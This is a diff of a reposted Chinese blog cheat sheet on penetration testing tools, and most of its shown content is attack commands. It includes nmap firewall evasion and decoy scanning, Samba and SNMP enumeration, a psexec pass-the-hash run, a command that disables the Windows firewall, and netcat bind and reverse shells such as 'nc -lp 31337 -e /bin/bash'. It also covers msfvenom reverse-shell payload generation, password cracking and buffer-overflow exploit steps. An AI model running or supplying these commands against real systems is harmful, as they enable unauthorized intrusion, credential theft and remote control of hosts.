@@ -2,67 +2,64 @@
 title: 渗透测试工具实战技巧
 time: 2016.05.29 0:40:00
 layout: post
+catalog: true
 tags:
-- 渗透
-- 工具
-- 实战技巧
-- 安全相关
+- Security
 excerpt: 对一些渗透测试工具实战技巧的总结，转载。
-
 ---
 
 # 最好的 NMAP 扫描策略
-		
+
 ###  适用所有大小网络最好的 nmap 扫描策略
 
 	# 主机发现，生成存活主机列表
 	$ nmap -sn -T4 -oG Discovery.gnmap 192.168.56.0/24
 	$ grep "Status: Up" Discovery.gnmap | cut -f 2 -d ' ' > LiveHosts.txt
-
+	
 	# 端口发现，发现大部分常用端口
 	# http://nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf
 	$ nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt
 	$ nmap -sU -T4 -Pn -oN TopUDP -iL LiveHosts.txt
 	$ nmap -sS -T4 -Pn --top-ports 3674 -oG 3674 -iL LiveHosts.txt
-
+	
 	# 端口发现，发现全部端口，但 UDP 端口的扫描会非常慢
 	$ nmap -sS -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt
 	$ nmap -sU -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt
-
+	
 	# 显示 TCP/UDP 端口
 	$ grep "open" FullTCP|cut -f 1 -d ' ' | sort -nu | cut -f 1 -d '/' |xargs | sed 's/ /,/g'|awk '{print "T:"$0}'
 	$ grep "open" FullUDP|cut -f 1 -d ' ' | sort -nu | cut -f 1 -d '/' |xargs | sed 's/ /,/g'|awk '{print "U:"$0}'
-
+	
 	# 侦测服务版本
 	$ nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt
 	
 	# 扫做系统扫描
 	$ nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt
-
+	
 	# 系统和服务检测
 	$ nmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt
 ### Nmap – 躲避防火墙
 	# 分段
 	$ nmap -f
-
+	
 	# 修改默认 MTU 大小，但必须为 8 的倍数(8,16,24,32 等等)
 	$ nmap --mtu 24
-
+	
 	# 生成随机数量的欺骗
 	$ nmap -D RND:10 [target]
-
+	
 	# 手动指定欺骗使用的 IP
 	$ nmap -D decoy1,decoy2,decoy3 etc.
-
+	
 	# 僵尸网络扫描, 首先需要找到僵尸网络的IP
 	$ nmap -sI [Zombie IP] [Target IP]
-
+	
 	# 指定源端口号
 	$ nmap --source-port 80 IP
-
+	
 	# 在每个扫描数据包后追加随机数量的数据
 	$ nmap --data-length 25 IP
-
+	
 	# MAC 地址欺骗，可以生成不同主机的 MAC 地址
 	$ nmap --spoof-mac Dell/Apple/3Com IP
 ### Nmap 进行 Web 漏洞扫描
@@ -81,7 +78,6 @@ excerpt: 对一些渗透测试工具实战技巧的总结，转载。
 注：DIRB 是一个专门用于爆破目录的工具，在 Kali 中默认已经安装，类似工具还有国外的patator，dirsearch，DirBuster， 国内的御剑等等。
 
 	dirb http://IP:PORT /usr/share/dirb/wordlists/common.txt
- 
 -----
 
 # Patator – 全能暴力破解测试工具
@@ -106,7 +102,6 @@ excerpt: 对一些渗透测试工具实战技巧的总结，转载。
 # 使用 Nikto 扫描 Web 服务
 
 	nikto -C all -h http://IP
-
 -----
 
 # 扫描 WordPress
@@ -141,7 +136,7 @@ for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done
 
 	us -H -msf -Iv 192.168.56.101 -p 1-65535
 	us -H -mU -Iv 192.168.56.101 -p 1-65535
-
+	
 	-H 在生成报告阶段解析主机名
 	-m 扫描类型 (sf - tcp, U - udp)
 	-Iv - 详细
@@ -151,11 +146,10 @@ for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done
 # 使用 Xprobe2 识别操作系统指纹
 
 	xprobe2 -v -p tcp:80:open IP
-
 -----
 
 # 枚举 Samba
-	
+
 	nmblookup -A target
 	smbclient //MOUNT/share -I target -N
 	rpcclient -U "" target
@@ -168,7 +162,7 @@ for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done
 	snmpget -v 1 -c public IP
 	snmpwalk -v 1 -c public IP
 	snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP
-	
+
 -----
 
 # 实用的 Windows cmd 命令
@@ -189,9 +183,8 @@ for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done
 
 # PuTTY 连接隧道
 转发远程端口到目标地址
-	
+​	
 	plink.exe -P 22 -l root -pw "1234" -R 445:127.0.0.1:445 IP
-	
 ---
 
 # Meterpreter 端口转发
@@ -209,7 +202,6 @@ for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done
 # 关闭 Windows 防火墙
 
 	netsh firewall set opmode disable
-
 ----
 
 # Meterpreter VNC/RDP
@@ -243,13 +235,12 @@ for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done
 	msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
 	msf exploit(psexec) > exploit
 	meterpreter > shell
-	
+
 -----
 
 # 使用 Hashcat 破解密码
 
 	hashcat -m 400 -a 0 hash /root/rockyou.txt
-
 ----
 
 # 使用 NC 抓取 Banner 信息
@@ -265,11 +256,11 @@ for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done
 	nc 192.168.0.10 31337
 	c:>nc example.com 80 -e cmd.exe
 	nc -lp 80
-
+	
 	nc -lp 31337 -e /bin/bash
 	nc 192.168.0.10 31337
 	nc -vv -r(random) -w(wait) 1 192.168.0.10 -z(i/o error) 1-1000
-	
+
 ----
 
 # 查找 SUID/SGID root 文件
@@ -291,7 +282,6 @@ for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done
 # 查找软连接及其指向:
 
 	find / -type l -ls
-	
 ----
 
 # Python shell
@@ -300,14 +290,13 @@ for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done
 	python2 -m SimpleHTTPServer
 	python3 -m http.server
 	ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 8888, :D ocumentRoot => Dir.pwd).start"
-	
+
 ---
 
 # php -S 0.0.0.0:8888
 获取进程对应的 PID
 fuser -nv tcp 80
 fuser -k -n tcp 80
-
 
 -----
 
@@ -529,7 +518,7 @@ find . | xargs -I file lsattr -a file 2>/dev/null | grep ‘^….i’
 # Windows 缓冲区溢出利用命令
 	msfvenom -p windows/shell_bind_tcp -a x86 --platform win -b "/x00" -f c
 	msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 -a x86 --platform win -e x86/shikata_ga_nai -b "/x00" -f c
-
+	
 	COMMONLY USED BAD CHARACTERS:
 	/x00/x0a/x0d/x20                              For http request
 	/x00/x0a/x0d/x20/x1a/x2c/x2e/3a/x5c           Ending with (0/n/r_)
@@ -539,12 +528,12 @@ find . | xargs -I file lsattr -a file 2>/dev/null | grep ‘^….i’
 	pattern offset (EIP Address)
 	pattern offset (ESP Address)
 	add garbage upto EIP value and add (JMP ESP address) in EIP . (ESP = shellcode )
-
+	
 	!pvefindaddr pattern_create 5000
 	!pvefindaddr suggest
 	!pvefindaddr modules
 	!pvefindaddr nosafeseh
-
+	
 	!mona config -set workingfolder C:/Mona/%p
 	!mona config -get workingfolder
 	!mona mod
@@ -556,7 +545,7 @@ find . | xargs -I file lsattr -a file 2>/dev/null | grep ‘^….i’
 
 	# SEH – 结构化异常处理
 	注：SEH(“Structured Exception Handling”)，即结构化异常处理，是 windows 操作系统提供给程序设计者的强有力的处理程序错误或异常的武器。
-
+	
 	# https://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms#SEH
 	# http://baike.baidu.com/view/243131.htm
 	!mona suggest
@@ -565,9 +554,9 @@ find . | xargs -I file lsattr -a file 2>/dev/null | grep ‘^….i’
 	iseh= !pvefindaddr p1 -n -o -i (POP POP RETRUN or POPr32,POPr32,RETN)
 	ROP (DEP)
 	注：ROP(“Return-Oriented Programming”)是计算机安全漏洞利用技术，该技术允许攻击者在安全防御的情况下执行代码，如不可执行的内存和代码签名。
-
+	
 	DEP(“Data Execution Prevention”)是一套软硬件技术，在内存上严格将代码和数据进行区分，防止数据当做代码执行。
-
+	
 	# https://en.wikipedia.org/wiki/Return-oriented_programming
 	# https://zh.wikipedia.org/wiki/%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B
 	# https://en.wikipedia.org/wiki/Data_Execution_Prevention
@@ -581,7 +570,7 @@ find . | xargs -I file lsattr -a file 2>/dev/null | grep ‘^….i’
 	!mona noaslr
 	寻蛋(EGG Hunter)技术
 	Egg hunting这种技术可以被归为“分级shellcode”，它主要可以支持你用一小段特制的shellcode来找到你的实际的（更大的）shellcode（我们的‘鸡蛋‘），原理就是通过在内存中搜索我们的最终shellcode。换句话说，一段短代码先执行，然后再去寻找真正的shellcode并执行。– 参考自看雪论坛，更多详情可以查阅我在代码注释中增加的链接。
-
+	
 	# https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/
 	# http://www.pediy.com/kssd/pediy12/116190/831793/45248.pdf
 	# http://www.fuzzysecurity.com/tutorials/expDev/4.html
